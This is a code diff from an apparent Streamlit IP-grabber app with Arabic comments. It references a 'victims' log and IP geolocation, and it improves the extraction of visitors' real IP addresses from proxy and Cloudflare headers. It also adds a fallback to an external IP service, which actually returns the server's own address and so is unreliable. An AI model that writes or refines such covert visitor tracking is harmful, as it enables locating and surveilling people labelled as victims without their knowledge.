@@ -114,14 +114,32 @@ def clear_victims_log():
 # ============= دوال الحصول على IP =============
 
 def get_server_side_ip():
-    """جلب عنوان IP من رؤوس الطلب"""
+    """جلب عنوان IP الحقيقي من رؤوس الطلب"""
     try:
         if hasattr(st, 'context') and hasattr(st.context, 'headers'):
             headers = st.context.headers
             if "X-Forwarded-For" in headers:
-                return headers["X-Forwarded-For"].split(",")[0].strip()
+                ip = headers["X-Forwarded-For"].split(",")[0].strip()
+                if ip and ip != "127.0.0.1" and not ip.startswith("192.168"):
+                    return ip
+            if "X-Real-IP" in headers:
+                ip = headers["X-Real-IP"].strip()
+                if ip and ip != "127.0.0.1" and not ip.startswith("192.168"):
+                    return ip
+            if "CF-Connecting-IP" in headers:
+                ip = headers["CF-Connecting-IP"].strip()
+                if ip and ip != "127.0.0.1" and not ip.startswith("192.168"):
+                    return ip
     except:
         pass
+    
+    try:
+        response = requests.get('https://api.ipify.org?format=json', timeout=3)
+        if response.status_code == 200:
+            return response.json().get('ip', 'Unknown')
+    except:
+        pass
+    
     return "Unknown"
 
 def get_geo_data(ip):
